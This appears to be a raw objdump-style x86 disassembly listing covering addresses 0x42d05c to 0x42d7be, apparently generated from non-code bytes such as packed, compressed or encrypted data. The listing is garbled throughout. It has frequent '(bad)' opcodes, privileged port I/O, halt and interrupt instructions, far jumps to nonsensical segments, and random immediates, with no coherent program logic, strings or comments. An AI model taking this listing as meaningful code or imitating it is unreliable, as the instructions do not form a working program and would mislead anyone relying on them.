  42d05c:	xchg   BYTE PTR [eax],cl
  42d05e:	outs   dx,BYTE PTR ds:[esi]
  42d05f:	test   eax,0x6c6d11c7
  42d064:	jge    0x42d0d0
  42d066:	jnp    0x42d0d4
  42d068:	fist   DWORD PTR [edi+0x54]
  42d06b:	push   edx
  42d06c:	(bad)  
  42d06d:	push   esi
  42d06e:	push   edx
  42d06f:	jmp    0x4de83f1c
  42d074:	inc    ecx
  42d075:	xor    esi,eax
  42d077:	inc    edx
  42d078:	dec    edx
  42d079:	mov    al,0x85
  42d07b:	sahf   
  42d07c:	mov    bh,0x26
  42d07e:	mov    dl,BYTE PTR [esi+0x1a15a141]
  42d084:	ja     0x42d0ea
  42d086:	stos   DWORD PTR es:[edi],eax
  42d087:	fiadd  DWORD PTR ds:0x3f1468dc
  42d08d:	jle    0x42d067
  42d08f:	pushf  
  42d090:	pop    ss
  42d091:	ret    0xb1bb
  42d094:	jo     0x42d0c0
  42d096:	mov    ds:0x7427f925,al
  42d09b:	popa   
  42d09c:	jp     0x42d0cc
  42d09e:	ins    BYTE PTR es:[edi],dx
  42d09f:	in     eax,dx
  42d0a0:	inc    edx
  42d0a1:	push   edx
  42d0a2:	push   ecx
  42d0a3:	out    dx,al
  42d0a4:	mov    DWORD PTR [esi+0x6a],ebp
  42d0a7:	jl     0x42d11b
  42d0a9:	pop    edi
  42d0aa:	fstp   QWORD PTR [edx]
  42d0ac:	add    dh,BYTE PTR [esi]
  42d0ae:	arpl   WORD PTR [edx],di
  42d0b0:	aas    
  42d0b1:	and    dl,BYTE PTR [ebx-0x5a]
  42d0b4:	xchg   ebp,eax
  42d0b5:	stos   DWORD PTR es:[edi],eax
  42d0b6:	mov    edx,0x1f781175
  42d0bb:	jp     0x42d049
  42d0bd:	cwde   
  42d0be:	shr    DWORD PTR [eax],1
  42d0c0:	jbe    0x42d102
  42d0c2:	mov    cl,0xc9
  42d0c4:	sbb    DWORD PTR [ecx+0x476dffc],esp
  42d0ca:	fnstsw WORD PTR [edx]
  42d0cc:	leave  
  42d0cd:	pop    ecx
  42d0ce:	inc    esp
  42d0cf:	mov    dl,0x28
  42d0d1:	scas   al,BYTE PTR es:[edi]
  42d0d2:	mov    ds:0xf41d0c49,eax
  42d0d7:	fist   DWORD PTR [ebp+0x4ed2dacb]
  42d0dd:	std    
  42d0de:	in     eax,0xbe
  42d0e0:	rcl    ah,1
  42d0e2:	push   edx
  42d0e3:	xor    DWORD PTR [edx+0x2293625c],0x5a
  42d0ea:	mov    edx,0x6c9c51d1
  42d0ef:	scas   al,BYTE PTR es:[edi]
  42d0f0:	xor    eax,0x8b4fc53f
  42d0f5:	sub    ch,0x56
  42d0f8:	cmp    BYTE PTR [esi],bh
  42d0fa:	jge    0x42d0de
  42d0fc:	sub    DWORD PTR [edx],ecx
  42d0fe:	inc    ebp
  42d0ff:	mov    eax,0xc5b7d2c0
  42d104:	out    dx,eax
  42d105:	cmp    BYTE PTR [edi-0x53],bh
  42d108:	rcr    DWORD PTR [eax],0x89
  42d10b:	xor    DWORD PTR [ecx-0x242b4f50],esi
  42d111:	sub    al,0x79
  42d113:	mov    al,ds:0x6d3e0702
  42d118:	inc    ebp
  42d119:	in     eax,dx
  42d11a:	mov    dh,0x0
  42d11c:	dec    ebp
  42d11d:	xchg   edx,eax
  42d11e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d11f:	mov    edi,0x55d8674a
  42d124:	(bad)  
  42d125:	ss push eax
  42d127:	cmp    BYTE PTR [ebx],ch
  42d129:	ins    BYTE PTR es:[edi],dx
  42d12a:	pop    esi
  42d12b:	mov    cl,0x41
  42d12d:	sub    eax,0x6a93806c
  42d132:	ret    0xaf47
  42d135:	sub    BYTE PTR [edx-0x743aae2f],bh
  42d13b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d13c:	or     eax,0x176816bc
  42d141:	mov    edx,0xf3255a3e
  42d146:	dec    edx
  42d147:	pop    ecx
  42d148:	(bad)  
  42d149:	repz pop ebx
  42d14b:	mov    al,ds:0xfddb5db0
  42d150:	pop    ecx
  42d151:	hlt    
  42d152:	mov    ebx,0x200b5624
  42d157:	pusha  
  42d158:	sub    esp,DWORD PTR [edx+0x4b]
  42d15b:	sbb    ch,BYTE PTR [ebx+ecx*2-0x7e4557af]
  42d162:	into   
  42d163:	sbb    ch,BYTE PTR [edx-0x80]
  42d166:	or     ebp,DWORD PTR [ebp+0x47]
  42d169:	adc    ebp,ebp
  42d16b:	push   es
  42d16c:	inc    eax
  42d16d:	or     edx,DWORD PTR [esi]
  42d16f:	cdq    
  42d170:	sub    BYTE PTR [esi-0x7b],0x4b
  42d174:	jno    0x42d150
  42d176:	clc    
  42d177:	sbb    al,0x1d
  42d179:	and    edi,DWORD PTR [ebx]
  42d17b:	mov    ch,0x4b
  42d17d:	adc    al,0x86
  42d17f:	or     al,BYTE PTR [ebp+edi*8+0x26]
  42d183:	rol    DWORD PTR [eax],1
  42d185:	dec    ebx
  42d186:	shl    BYTE PTR [edx-0x42cd5ba7],1
  42d18c:	icebp  
  42d18d:	add    al,0xbb
  42d18f:	or     bl,dl
  42d191:	mov    cl,al
  42d193:	and    edx,DWORD PTR [edi]
  42d195:	ja     0x42d1cd
  42d197:	sub    eax,0x16435b45
  42d19c:	push   ebx
  42d19d:	or     BYTE PTR es:[eax],cl
  42d1a0:	mov    ebp,0xb5035cdc
  42d1a5:	lods   eax,DWORD PTR ds:[esi]
  42d1a6:	and    edi,ecx
  42d1a8:	cli    
  42d1a9:	pop    edi
  42d1aa:	add    bh,ah
  42d1ac:	fisttp DWORD PTR [eax]
  42d1ae:	bound  edx,QWORD PTR [ebx]
  42d1b0:	adc    DWORD PTR [esp+edi*2+0x59],ecx
  42d1b4:	xor    eax,0xfeeadd10
  42d1b9:	dec    ecx
  42d1ba:	pop    esi
  42d1bb:	out    0xc2,eax
  42d1bd:	xchg   esi,eax
  42d1be:	xchg   ebx,eax
  42d1bf:	in     eax,dx
  42d1c0:	sub    BYTE PTR [eax+0x6733b3b0],bh
  42d1c6:	jecxz  0x42d176
  42d1c8:	out    0xe6,eax
  42d1ca:	(bad)  
  42d1cb:	mov    ds:0x9bb04436,al
  42d1d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d1d1:	adc    BYTE PTR [esi*8-0x4549fc95],dh
  42d1d8:	imul   eax,ebx,0x872a39bb
  42d1de:	sub    BYTE PTR [esi-0x10a455d2],dh
  42d1e4:	jecxz  0x42d181
  42d1e6:	jge    0x42d185
  42d1e8:	sub    ebp,0x6e
  42d1eb:	jne    0x42d1f2
  42d1ed:	fucomp st(4)
  42d1ef:	push   es
  42d1f0:	addr16 aaa 
  42d1f2:	adc    BYTE PTR [esi],0x70
  42d1f5:	add    eax,DWORD PTR [ebp+0x76968aa6]
  42d1fb:	es adc al,0x3
  42d1fe:	(bad)  
  42d1ff:	mov    ss:0xddd4d45c,al
  42d205:	arpl   WORD PTR [ecx],dx
  42d207:	cmc    
  42d208:	fisubr DWORD PTR [ebp-0x5d]
  42d20b:	fnstsw WORD PTR [ebx]
  42d20d:	and    al,0xb6
  42d20f:	adc    DWORD PTR [eax],ebx
  42d211:	mov    ds:0x6ea595b6,eax
  42d216:	inc    ebp
  42d217:	adc    eax,DWORD PTR [ebp-0x69]
  42d21a:	das    
  42d21b:	and    BYTE PTR [edi-0x22],al
  42d21e:	test   DWORD PTR [edx-0x4892aef3],0x22f0e54c
  42d228:	jbe    0x42d293
  42d22a:	fstp   TBYTE PTR [edx]
  42d22c:	(bad)  
  42d22d:	mov    fs,WORD PTR [esi+edi*8-0xb7f4bf2]
  42d234:	dec    edi
  42d235:	adc    DWORD PTR [eax-0x7f2bc92c],edi
  42d23b:	pop    ds
  42d23c:	test   al,0x1e
  42d23e:	xor    al,ch
  42d240:	jmp    0xbc22:0xec410d64
  42d247:	jecxz  0x42d212
  42d249:	out    0x68,eax
  42d24b:	in     eax,dx
  42d24c:	inc    edx
  42d24d:	fld    TBYTE PTR [esi-0x6b]
  42d250:	xchg   esp,eax
  42d251:	retf   0x451a
  42d254:	(bad)  
  42d255:	mov    eax,0x7d17f474
  42d25a:	pop    ebp
  42d25b:	push   0x0
  42d25d:	sbb    eax,0x16e62838
  42d262:	inc    esp
  42d263:	mov    ecx,0x6bb85b41
  42d268:	daa    
  42d269:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d26a:	xchg   ecx,eax
  42d26b:	mov    WORD PTR [edi-0x7a],?
  42d26e:	xchg   BYTE PTR [edx],bl
  42d270:	push   eax
  42d271:	push   eax
  42d272:	pop    es
  42d273:	ins    DWORD PTR es:[edi],dx
  42d274:	out    dx,eax
  42d275:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  42d277:	mov    ch,bl
  42d279:	mov    ah,BYTE PTR [eax-0x25]
  42d27c:	enter  0x643,0x2c
  42d280:	scas   al,BYTE PTR es:[edi]
  42d281:	and    ah,BYTE PTR [ebx+ebp*2+0x6371b001]
  42d288:	or     ebp,DWORD PTR [edi-0x21]
  42d28b:	sbb    BYTE PTR [eax],0xb6
  42d28e:	inc    ebp
  42d28f:	sbb    esp,DWORD PTR [edx+0x27eb9fd8]
  42d295:	add    eax,0x6db6f39a
  42d29a:	push   ebp
  42d29b:	xor    eax,0xb9708c5f
  42d2a0:	enter  0xe9a2,0x6
  42d2a4:	int    0x4
  42d2a6:	fstp   TBYTE PTR [edi+0x4d]
  42d2a9:	add    bl,BYTE PTR [ebx+0x56b74a63]
  42d2af:	rcl    ebx,1
  42d2b1:	cs adc al,0x3c
  42d2b4:	xchg   ebp,eax
  42d2b5:	clc    
  42d2b6:	addr16 adc dh,al
  42d2b9:	(bad)  
  42d2ba:	adc    BYTE PTR [esp+ebp*4],al
  42d2bd:	sbb    DWORD PTR [edi+eiz*1+0x16ff3472],ecx
  42d2c4:	fistp  DWORD PTR [esi+0x20]
  42d2c7:	mov    ah,0x72
  42d2c9:	lahf   
  42d2ca:	dec    eax
  42d2cb:	add    BYTE PTR [eax+0x69b300c1],bh
  42d2d1:	sbb    al,BYTE PTR [edx]
  42d2d3:	fiadd  DWORD PTR [edx+edi*8]
  42d2d6:	sbb    ah,BYTE PTR [edi]
  42d2d8:	mov    ch,0x78
  42d2da:	adc    ah,bl
  42d2dc:	ss ss cmp al,0x13
  42d2e0:	or     DWORD PTR [ecx-0x5fe96a80],esi
  42d2e6:	loop   0x42d33a
  42d2e8:	add    edx,DWORD PTR [eax-0x7d]
  42d2eb:	in     al,dx
  42d2ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d2ed:	int    0x63
  42d2ef:	popa   
  42d2f0:	sub    ebp,ebp
  42d2f2:	daa    
  42d2f3:	mov    bh,0x1c
  42d2f5:	mov    ecx,0xc6678a08
  42d2fa:	(bad)  
  42d2fb:	fcmovb st,st(2)
  42d2fd:	test   DWORD PTR [esi+0x63],esi
  42d300:	xor    eax,0x5771c7fb
  42d305:	mov    eax,0xa1a29803
  42d30a:	mov    dh,0x8a
  42d30c:	adc    al,0x58
  42d30e:	jl     0x42d31a
  42d310:	inc    ebp
  42d311:	fstp   QWORD PTR [edx]
  42d313:	fs mov eax,0x8d6b0bee
  42d319:	aaa    
  42d31a:	dec    edx
  42d31b:	adc    DWORD PTR ds:0xf93f1bdd,ebx
  42d321:	fsubr  st(2),st
  42d323:	(bad)  
  42d324:	(bad)  
  42d325:	ins    DWORD PTR es:[edi],dx
  42d326:	imul   ebx,DWORD PTR [ebp+edx*4+0x29],0xffffffb0
  42d32b:	popf   
  42d32c:	adc    cl,bh
  42d32e:	push   ecx
  42d32f:	ins    DWORD PTR es:[edi],dx
  42d330:	dec    ebp
  42d331:	adc    DWORD PTR [edi-0x668da788],edx
  42d337:	je     0x42d368
  42d339:	mov    al,gs:0x80bfe5b6
  42d33f:	mov    edx,0x83b005f
  42d344:	add    BYTE PTR [esi-0x19e29a74],cl
  42d34a:	pop    ebp
  42d34b:	add    eax,0x2611add
  42d350:	or     ebp,DWORD PTR [ecx]
  42d352:	popf   
  42d353:	lods   eax,DWORD PTR ds:[esi]
  42d354:	and    al,0x4
  42d356:	sbb    BYTE PTR [eax-0x76df414a],al
  42d35c:	fisubr DWORD PTR [ebp+0x356dba8b]
  42d362:	mov    edi,0x4819d0b0
  42d367:	add    al,0xfe
  42d369:	inc    ecx
  42d36a:	je     0x42d347
  42d36c:	mov    dh,0x4d
  42d36e:	sub    DWORD PTR [ebx-0x46470c5],esi
  42d374:	xor    dh,BYTE PTR [eax-0x6427f593]
  42d37a:	scas   al,BYTE PTR es:[edi]
  42d37b:	cmc    
  42d37c:	add    al,0xa6
  42d37e:	stc    
  42d37f:	dec    edx
  42d380:	addr16 mov eax,0xea4476d1
  42d386:	pop    ebx
  42d387:	xor    al,0x32
  42d389:	and    al,0xec
  42d38b:	jecxz  0x42d36c
  42d38d:	push   0xa793d820
  42d392:	ret    0x5119
  42d395:	(bad)  
  42d396:	popf   
  42d397:	add    dh,bl
  42d399:	mov    dh,0x9a
  42d39b:	add    dl,BYTE PTR [esi-0x2b50e087]
  42d3a1:	mov    ch,0xef
  42d3a3:	outs   dx,BYTE PTR ds:[esi]
  42d3a4:	or     eax,0x2ebc9741
  42d3a9:	push   edx
  42d3aa:	icebp  
  42d3ab:	mov    ebx,0x222fbe59
  42d3b0:	mov    eax,0xb908d4b4
  42d3b5:	cld    
  42d3b6:	jge    0x42d368
  42d3b8:	mov    ds:0xaed55c00,eax
  42d3bd:	out    0x68,al
  42d3bf:	pop    ds
  42d3c0:	repnz add BYTE PTR [edx-0x7b],0x5b
  42d3c5:	dec    esi
  42d3c6:	add    ebp,edi
  42d3c8:	push   ecx
  42d3c9:	pop    eax
  42d3ca:	mov    edx,0x329795b1
  42d3cf:	int3   
  42d3d0:	push   ds
  42d3d1:	cmp    al,0xd3
  42d3d3:	mov    edi,0x1b1b1179
  42d3d8:	or     bh,ah
  42d3da:	xchg   edx,esi
  42d3dc:	shl    BYTE PTR [edx-0x3a],0x46
  42d3e0:	popa   
  42d3e1:	pop    ss
  42d3e2:	jp     0x42d38b
  42d3e4:	inc    ebx
  42d3e5:	xchg   esp,eax
  42d3e6:	mov    bh,0x1c
  42d3e8:	in     eax,dx
  42d3e9:	mov    ds:0xcbd2ed0b,al
  42d3ee:	sub    DWORD PTR [eax+0x5c0132d1],edx
  42d3f4:	repz mov al,ds:0xac1816db
  42d3fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d3fb:	add    edx,DWORD PTR [esi+0x46]
  42d3fe:	bnd jmp 0x42d463
  42d401:	mov    eax,ds:0xeea03829
  42d406:	ins    BYTE PTR es:[edi],dx
  42d407:	add    edi,0xb6d6e8b3
  42d40d:	pop    ebx
  42d40e:	out    0x79,al
  42d410:	rcl    cl,1
  42d412:	xlat   BYTE PTR ds:[ebx]
  42d413:	enter  0xc65,0x44
  42d417:	fnstenv [esi]
  42d419:	ror    DWORD PTR [esi],0x4c
  42d41c:	enter  0x2c68,0x84
  42d420:	ss add eax,0xfda3761c
  42d426:	pusha  
  42d427:	cmp    BYTE PTR [esi],ah
  42d429:	push   0xffffffce
  42d42b:	pop    esp
  42d42c:	xor    BYTE PTR ds:0xad80951b,dl
  42d432:	xor    eax,0x303b08b6
  42d437:	jl     0x42d3d1
  42d439:	dec    ebx
  42d43a:	add    eax,0x87226858
  42d43f:	clc    
  42d440:	ins    DWORD PTR es:[edi],dx
  42d441:	fcom   DWORD PTR [ebx]
  42d443:	push   ecx
  42d444:	aam    0x2
  42d446:	ins    BYTE PTR es:[edi],dx
  42d447:	xchg   BYTE PTR [esi],bh
  42d449:	test   eax,0x20ec51f
  42d44e:	fdivr  st,st(3)
  42d450:	int3   
  42d451:	ins    DWORD PTR es:[edi],dx
  42d452:	scas   eax,DWORD PTR es:[edi]
  42d453:	aad    0x3a
  42d455:	mov    dh,0x6c
  42d457:	pop    ebx
  42d458:	push   edi
  42d459:	(bad)  
  42d45b:	into   
  42d45c:	jp     0x42d40e
  42d45e:	jmp    0x89f9011f
  42d463:	mov    ch,ch
  42d465:	mov    al,ds:0xb0f9bc5a
  42d46a:	adc    eax,0x60a62cd6
  42d46f:	push   ebx
  42d470:	rcl    esi,1
  42d472:	js     0x42d4ca
  42d474:	mov    esp,0xb6d5d630
  42d479:	push   ecx
  42d47a:	ret    
  42d47b:	push   esp
  42d47c:	push   esi
  42d47d:	sub    edx,DWORD PTR [eax+0x59]
  42d480:	xchg   ebp,eax
  42d481:	sbb    eax,0x3edadc54
  42d486:	jge    0x42d48d
  42d488:	push   ecx
  42d489:	in     al,dx
  42d48a:	mov    edx,0x808ed080
  42d48f:	sbb    ecx,DWORD PTR [esi-0x69]
  42d492:	cmp    eax,0xa76ce4f5
  42d497:	test   DWORD PTR [ebx+0x53],ebx
  42d49a:	repnz aaa 
  42d49c:	enter  0x415c,0xac
  42d4a0:	or     bh,al
  42d4a2:	mov    edx,0xa2b68a51
  42d4a7:	adc    DWORD PTR [edx],esi
  42d4a9:	repnz xor edx,DWORD PTR [ebp-0x50]
  42d4ad:	fcomp  DWORD PTR [edx]
  42d4af:	mov    ebx,0x9f32668a
  42d4b4:	mov    edx,0x6dc0b0e3
  42d4b9:	mov    eax,ds:0x11671f5d
  42d4be:	(bad)  
  42d4bf:	push   edx
  42d4c0:	aas    
  42d4c1:	lods   eax,DWORD PTR ds:[esi]
  42d4c2:	lahf   
  42d4c3:	inc    esi
  42d4c4:	test   DWORD PTR [ebx+0x5b],ecx
  42d4c7:	inc    edi
  42d4c8:	adc    eax,esp
  42d4ca:	adc    al,0xd5
  42d4cc:	fisttp QWORD PTR ds:0x23a31c05
  42d4d2:	sbb    BYTE PTR [ebx],0x9c
  42d4d5:	jl     0x42d4c1
  42d4d7:	mov    ebx,0xa36a4b0a
  42d4dc:	mov    dh,0x76
  42d4de:	cdq    
  42d4df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d4e0:	pop    ecx
  42d4e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d4e2:	bound  ebp,QWORD PTR [esi-0x522eac5c]
  42d4e8:	or     DWORD PTR [eax],edi
  42d4ea:	bound  eax,QWORD PTR [edx]
  42d4ec:	in     eax,0x16
  42d4ee:	lock fcmovnb st,st(2)
  42d4f1:	or     eax,0xe5765802
  42d4f6:	jo     0x42d4fa
  42d4f8:	mov    esp,0x8b5b8de
  42d4fd:	or     cl,ch
  42d4ff:	dec    ebp
  42d500:	sti    
  42d501:	dec    ebx
  42d502:	and    DWORD PTR [edx-0x25],ecx
  42d505:	mov    dh,0x9
  42d507:	mov    ds:0xb76e600c,eax
  42d50c:	je     0x42d54a
  42d50e:	add    edx,0x42
  42d511:	pop    ebx
  42d512:	mov    al,ds:0x524169f6
  42d517:	pop    es
  42d518:	mov    es,WORD PTR [ebx]
  42d51a:	test   DWORD PTR [ebp+0x56112adb],eax
  42d520:	adc    edi,DWORD PTR [edi+ecx*1-0x27]
  42d524:	push   esp
  42d525:	add    eax,0x4d5a976c
  42d52a:	sbb    eax,0x3e2b081a
  42d52f:	ss push es
  42d531:	stos   BYTE PTR es:[edi],al
  42d532:	outs   dx,BYTE PTR ds:[esi]
  42d533:	dec    ebp
  42d534:	pop    ebx
  42d535:	cs ret 0xd592
  42d539:	arpl   WORD PTR ds:0xe4c2b705,si
  42d53f:	pop    esi
  42d540:	cmp    bl,BYTE PTR [eax+esi*1+0x6]
  42d544:	repz daa 
  42d546:	mov    ah,0xa1
  42d548:	mov    eax,0x98e1796d
  42d54d:	cs lea ecx,es:[edi]
  42d551:	stos   DWORD PTR es:[edi],eax
  42d552:	in     eax,dx
  42d553:	(bad)  
  42d554:	jle    0x42d506
  42d556:	cwde   
  42d557:	and    dh,ch
  42d559:	scas   al,BYTE PTR es:[edi]
  42d55a:	bound  esp,QWORD PTR [ebp+0x26]
  42d55d:	push   0x20fb89f8
  42d562:	push   0x52788a2
  42d567:	xchg   ecx,eax
  42d568:	call   0xca74:0x547636a4
  42d56f:	sub    eax,0xedc350b1
  42d574:	not    cl
  42d576:	test   DWORD PTR [esi-0x6e4573fe],ecx
  42d57c:	sub    ebp,DWORD PTR [ebx]
  42d57e:	mov    eax,ds:0xe410d155
  42d583:	push   es
  42d584:	mov    ds:0xdb68816,al
  42d589:	jo     0x42d515
  42d58b:	faddp  st(1),st
  42d58d:	push   ss
  42d58e:	xor    eax,0xb6db4c47
  42d593:	dec    ebx
  42d594:	loopne 0x42d574
  42d596:	pop    edi
  42d597:	into   
  42d598:	(bad)  
  42d599:	and    esi,DWORD PTR [esi-0x20]
  42d59c:	mov    ebx,0xa283a30e
  42d5a1:	pop    ebx
  42d5a2:	xor    dl,BYTE PTR [edi+0x4d]
  42d5a5:	std    
  42d5a6:	int3   
  42d5a7:	pop    ebp
  42d5a8:	test   DWORD PTR [ebp-0x6a8b8973],ecx
  42d5ae:	gs mov edx,0x9d9e27d9
  42d5b4:	push   esi
  42d5b5:	mov    al,ds:0x7188a5b6
  42d5ba:	imul   esp,DWORD PTR [eax],0xffffff9e
  42d5bd:	push   ecx
  42d5be:	sbb    esp,DWORD PTR gs:[edx-0x6d121292]
  42d5c5:	xchg   edx,eax
  42d5c6:	cmp    eax,DWORD PTR [ebp+0x61e0c012]
  42d5cc:	mov    esp,DWORD PTR [edx+0x7]
  42d5cf:	push   esp
  42d5d0:	xchg   ecx,eax
  42d5d1:	(bad)  
  42d5d2:	mul    DWORD PTR ds:0xb685c2da
  42d5d8:	xchg   edi,eax
  42d5d9:	push   eax
  42d5da:	adc    al,0x9d
  42d5dc:	jg     0x42d5e9
  42d5de:	fdivr  DWORD PTR [di-0x5e]
  42d5e2:	ss add al,0xdc
  42d5e5:	inc    edi
  42d5e6:	sti    
  42d5e7:	pmaxub mm6,QWORD PTR [ebx+esi*4]
  42d5eb:	shr    DWORD PTR [ebp-0x7d],0x86
  42d5ef:	lea    esp,[edi]
  42d5f1:	jno    0x42d624
  42d5f3:	cmp    edi,DWORD PTR [esi]
  42d5f5:	aad    0x2e
  42d5f7:	ins    BYTE PTR es:[edi],dx
  42d5f8:	ins    DWORD PTR es:[edi],dx
  42d5f9:	pop    es
  42d5fa:	(bad)  
  42d5fb:	aam    0x64
  42d5fd:	lods   eax,DWORD PTR ds:[esi]
  42d5fe:	fwait
  42d5ff:	dec    eax
  42d600:	test   DWORD PTR [ebx+0x18],ebx
  42d603:	inc    ecx
  42d604:	fucomp st(0)
  42d606:	mov    bh,BYTE PTR [ebx-0x50b1bd1e]
  42d60c:	sub    al,0xec
  42d60e:	test   al,0x1d
  42d610:	icebp  
  42d611:	jge    0x42d68c
  42d613:	add    ch,ah
  42d615:	aas    
  42d616:	cmp    eax,0x6abadbf7
  42d61b:	inc    edi
  42d61c:	mov    edi,0x6dbe1a4a
  42d621:	stos   BYTE PTR es:[edi],al
  42d622:	lock out dx,eax
  42d624:	mov    ds:0xd36a3636,al
  42d629:	jle    0x42d6a5
  42d62b:	jb     0x42d5f9
  42d62d:	pop    ebp
  42d62e:	rol    esi,1
  42d630:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d631:	or     eax,0xaa5fd06
  42d636:	inc    eax
  42d637:	loope  0x42d673
  42d639:	mov    BYTE PTR [esi+0x6c],ch
  42d63c:	dec    ebp
  42d63d:	repnz sbb BYTE PTR [eax-0x3ea8c4f6],dh
  42d644:	mov    gs,WORD PTR [edx+0x29]
  42d647:	ins    DWORD PTR es:[edi],dx
  42d648:	out    0x1c,al
  42d64a:	test   DWORD PTR [esi],0x436220ed
  42d650:	rcl    BYTE PTR [ecx],1
  42d652:	mov    cl,0xfd
  42d654:	sahf   
  42d655:	loopne 0x42d69a
  42d657:	je     0x42d6bc
  42d659:	mov    eax,ds:0x33a9b265
  42d65e:	cmp    eax,0x828340d5
  42d663:	pop    ebx
  42d664:	popa   
  42d665:	jo     0x42d60d
  42d667:	pop    ebx
  42d668:	enter  0x893a,0x80
  42d66c:	lods   eax,DWORD PTR ds:[esi]
  42d66d:	dec    ebp
  42d66e:	add    al,0xb0
  42d670:	pushf  
  42d671:	loop   0x42d62a
  42d673:	push   esi
  42d674:	fwait
  42d675:	mov    BYTE PTR [ebx-0x7f],ch
  42d678:	push   ss
  42d679:	adc    eax,0x5572a267
  42d67e:	sbb    BYTE PTR [eax-0x78],0x6d
  42d682:	or     BYTE PTR [edi-0x55dcf6ad],ah
  42d688:	lods   eax,DWORD PTR ds:[esi]
  42d689:	add    eax,0x366c7cba
  42d68e:	rcr    esp,0x52
  42d691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d692:	call   0xfc69:0x20565aaa
  42d699:	pushf  
  42d69a:	ins    DWORD PTR es:[edi],dx
  42d69b:	dec    ebp
  42d69c:	mov    ah,0x54
  42d69e:	bnd ret 
  42d6a0:	outs   dx,DWORD PTR ds:[esi]
  42d6a1:	out    0x62,eax
  42d6a3:	cmp    BYTE PTR [edx+0x7ab1b6e0],cl
  42d6a9:	mov    ebp,0xd795ce8a
  42d6ae:	xor    ah,BYTE PTR [edx+0x3]
  42d6b1:	add    al,0x9b
  42d6b3:	(bad)  
  42d6b4:	push   ebp
  42d6b5:	sbb    dl,BYTE PTR [edi]
  42d6b7:	push   es
  42d6b8:	rcl    BYTE PTR [ebx+ecx*1-0x49],0xae
  42d6bd:	ret    
  42d6be:	hlt    
  42d6bf:	gs ins DWORD PTR es:[edi],dx
  42d6c1:	(bad)  
  42d6c2:	xchg   esp,eax
  42d6c3:	sbb    eax,0x342c2e80
  42d6c8:	xchg   ebp,eax
  42d6c9:	mov    edi,0x2d8b356a
  42d6ce:	jae    0x42d73c
  42d6d0:	or     eax,0x7a94ed41
  42d6d5:	jnp    0x42d700
  42d6d7:	mov    ecx,0x6e9759f8
  42d6dc:	xchg   ebp,eax
  42d6dd:	pop    ebx
  42d6de:	(bad)  
  42d6df:	push   ecx
  42d6e0:	mov    al,0x3d
  42d6e2:	sub    BYTE PTR ds:0x300c665,dl
  42d6e8:	mov    dh,0x1a
  42d6ea:	retf   
  42d6eb:	fbstp  TBYTE PTR [edx-0x7b02f6bb]
  42d6f1:	(bad)  [eax+0x2b]
  42d6f4:	add    BYTE PTR [ebp+0x11],ch
  42d6f7:	adc    al,0x6f
  42d6f9:	ja     0x42d722
  42d6fb:	xchg   BYTE PTR [eax+0x487e2b6d],cl
  42d701:	mov    al,0x31
  42d703:	jp     0x42d6a5
  42d705:	pop    ebx
  42d706:	push   edi
  42d707:	ror    BYTE PTR [esi+ecx*2-0x54],1
  42d70b:	clc    
  42d70c:	(bad)  
  42d70d:	pop    edx
  42d70e:	push   cs
  42d70f:	mov    al,ds:0x50a685a5
  42d714:	psubusw mm0,QWORD PTR [esi-0x7952220e]
  42d71b:	mov    eax,0x39088f15
  42d720:	jnp    0x42d71b
  42d722:	dec    esi
  42d723:	dec    esp
  42d724:	or     ebp,DWORD PTR ds:0xaa7fa580
  42d72a:	es int 0x31
  42d72d:	cli    
  42d72e:	fdiv   QWORD PTR [esi]
  42d730:	dec    edx
  42d731:	push   eax
  42d732:	jno    0x42d734
  42d734:	sbb    eax,0xfce7ba9e
  42d739:	adc    cl,BYTE PTR [ebp+0x51]
  42d73c:	outs   dx,DWORD PTR ds:[esi]
  42d73d:	add    eax,0xa22a2b
  42d742:	ret    
  42d743:	dec    ebp
  42d744:	pop    ss
  42d745:	fisubr DWORD PTR [ebp-0x5f]
  42d748:	(bad)  
  42d749:	lock or esi,DWORD PTR [ebx+0x77]
  42d74d:	cmp    BYTE PTR [ebx],ch
  42d74f:	fdiv   QWORD PTR [eax]
  42d751:	adc    al,BYTE PTR [eax+0x13]
  42d754:	add    DWORD PTR [ebp+0x5074a76a],edx
  42d75a:	ins    DWORD PTR es:[edi],dx
  42d75b:	mov    bh,0x2c
  42d75d:	add    ebp,DWORD PTR [ecx+0x5f]
  42d760:	xor    eax,0xa56ddbb8
  42d765:	mov    al,ds:0x1a390a54
  42d76a:	pop    esi
  42d76b:	lods   eax,DWORD PTR ds:[esi]
  42d76c:	ins    DWORD PTR es:[edi],dx
  42d76d:	fdiv   QWORD PTR [eax]
  42d76f:	xchg   ebp,eax
  42d770:	jb     0x42d7d5
  42d772:	out    dx,eax
  42d773:	and    DWORD PTR [esp+edi*4],eax
  42d776:	and    BYTE PTR [ebx+0x25b61ad0],bh
  42d77c:	push   esi
  42d77d:	sbb    dh,cl
  42d77f:	aas    
  42d780:	adc    BYTE PTR [esi],0xfb
  42d783:	mov    al,0x56
  42d785:	mov    dh,0x2b
  42d787:	test   al,0x65
  42d789:	stc    
  42d78a:	xchg   ebp,eax
  42d78b:	cmc    
  42d78c:	mov    WORD PTR [edx],gs
  42d78e:	in     al,dx
  42d78f:	aad    0x40
  42d791:	aam    0x85
  42d793:	push   ebp
  42d794:	(bad)  
  42d795:	pop    esp
  42d796:	or     bh,ch
  42d798:	les    eax,FWORD PTR [ebp-0x793dbd5b]
  42d79e:	xchg   DWORD PTR [edx],edi
  42d7a0:	and    BYTE PTR [ebx],dh
  42d7a2:	push   esp
  42d7a3:	sbb    ebp,DWORD PTR [ebp+0x17]
  42d7a6:	xor    BYTE PTR [esi+eiz*1-0x38],ch
  42d7aa:	fcom   st(7)
  42d7ac:	mov    edx,0x1ab10135
  42d7b1:	dec    esi
  42d7b2:	gs mov dh,0x59
  42d7b5:	arpl   cx,si
  42d7b7:	mov    dh,0xd
  42d7b9:	les    ebp,FWORD PTR [esi]
  42d7bb:	mov    DWORD PTR [esi],esp
  42d7bd:	push   edi
  42d7be:	test   DWORD PTR [ecx+0x54],0xdc6ce17a
